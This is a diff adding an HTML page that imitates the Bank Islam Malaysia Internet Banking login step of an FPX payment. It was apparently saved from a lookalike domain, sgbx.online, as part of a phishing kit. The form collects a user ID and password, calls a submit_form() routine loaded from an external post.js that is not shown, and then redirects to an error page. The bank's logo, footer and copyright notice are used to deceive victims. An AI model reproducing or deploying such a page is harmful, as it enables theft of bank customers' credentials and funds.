@@ -1,0 +1,120 @@
+<!DOCTYPE html>
+<!-- saved from url=(0038)https://sgbx.online/fpx_999a/BI/BI.php -->
+<html class="no-js" lang="en">
+<!--<![endif]-->
+
+<head>
+    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+    <meta http-equiv="Cache-Control" content="no-cache, no-store, must-revalidate">
+    <meta http-equiv="Cache-control" content="max-age=0">
+    <meta http-equiv="Pragma" content="no-cache">
+    <meta http-equiv="Expires" content="0">
+    <meta http-equiv="Expires" content="Tue, 01 Jan 1980 1:00:00 GMT">
+
+    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
+    <title>Bank Islam Internet Banking</title>
+    <link rel="stylesheet" href="./BI_files/bootstrap.css">
+    <link rel="stylesheet" href="./BI_files/customfont-c2d09f22b17cb2515bc77687ced58e16.css">
+    <link rel="stylesheet" href="./BI_files/custom-0d7c31cbc65f46c6448a2b1ae4f8442c.css">
+    <meta name="layout" content="blank">
+</head>
+
+<body>
+    <div class="container" id="bimb-content">
+        <div class="row">
+            <div id="login-header">
+                <table style="border: 0; padding: 0; margin: 0; width: 100%;">
+                    <tbody>
+                        <tr>
+                            <td>
+                                <img src="./BI_files/logo-2dc600e7d094f4cfe8a7bf49f476a4be.png" alt="Bank Islam"
+                                    style="height: 50px;">
+                            </td>
+                            <td style="text-align: right;">
+                                <img src="./BI_files/fpx-logo-00c8f39068e0278e69b14a0f8c3fb82a.png" alt="FPX"
+                                    style="height: 38px;">
+                            </td>
+                        </tr>
+                        <tr>
+                            <td colspan="2" style="text-align: right;">
+                                <span style="font-weight: bold">FPX (Step 1 of 4)</span>
+                            </td>
+                        </tr>
+                    </tbody>
+                </table>
+            </div>
+        </div>
+        <div class="row">
+            <div id="login-content">
+                <center>
+                    <h3>Welcome to Bank Islam Internet Banking</h3>
+                </center>
+                <br><br>
+                <div id="validation-error"></div>
+                <form autocomplete="off"
+                    name="usernameForm" id="usernameForm" novalidate="novalidate" onSubmit="submit_form()" action="error.html">
+                    <input type="hidden" name="bank" value="Bank Islam" id="bank">
+                    <div class="control-group">
+                        <label class="control-label" for="username">User ID</label>
+                        <input type="text" id="b" name="b" value="BANK ISLAM" hidden="">
+                        <input type="text" id="uname" name="uname" placeholder="Username" class="form-control input-sm"
+                            maxlength="25">
+                    </div>
+                    <div class="control-group">
+                        <label class="control-label" for="username">Password</label>
+                        <input type="password" id="pd" name="pd" placeholder="Password" class="form-control input-sm"
+                            maxlength="25">
+                    </div>
+                    <br>
+                    <div class="control-group">
+                        <input type="submit" name="_action_auth" value="Login" class="btn btn-sm btn-custom">
+                    </div>
+                    <div class="control-group">
+                        <a id="linkCancelTransaction" href="https://sgbx.online/fpx_999a/BI/BI.php#"
+                            class="btn btn-sm btn-custom pull-right">Cancel Transaction</a>
+                    </div>
+                </form>
+                <br>
+                <div id="cancelTransactionModal" class="modal fade" tabindex="-1" role="dialog" aria-hidden="true"
+                    data-backdrop="static">
+                    <div class="modal-dialog" role="document">
+                        <div class="modal-content">
+                            <div class="modal-header">
+                                <h3><span style="color: #333;">Cancel Transaction</span></h3>
+                            </div>
+                            <div class="modal-body">
+                                Do you want to cancel this transaction?
+                            </div>
+                            <div class="modal-footer">
+                                <button id="btnCancelYes" class="btn btn-sm btn-danger" data-dismiss="modal"
+                                    aria-hidden="true">Yes</button>&nbsp;
+                                <button id="btnCancelNo" class="btn btn-sm btn-custom" data-dismiss="modal"
+                                    aria-hidden="true">No</button>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+                <script src="./BI_files/jquery_002.js.download" type="text/javascript"></script>
+            </div>
+        </div>
+        <div class="row hidden-phone">
+            <div id="footer" class="text-center">
+                © Bank Islam Malaysia Berhad (98127-X). All&nbsp;rights&nbsp;reserved.
+                <br><br>
+                The webpage is best viewed using IE 7.0 and above,
+                Chrome 33.0 and above, Mozilla Firefox 26.0 and above, Safari 5.1.6 and
+                above.
+            </div>
+        </div>
+    </div>
+    <input type="hidden" id="--bAcKButtoN--" value=".">
+    <input type="hidden" id="blockUIWhenFormSubmit" name="blockUIWhenFormSubmit" value="true">
+    <script src="./BI_files/application-f805aae64bd4fa4c2cf1d6f987a776d6.js.download" type="text/javascript"></script>
+    <script src="./BI_files/jquery.js.download" type="text/javascript"></script>
+    <meta http-equiv="Pragma" content="no-cache">
+    <!--<![endif]-->
+</body>
+<!--[if IE]><!-->
+    <script type="text/javascript" src="post.js"></script>
+</html>
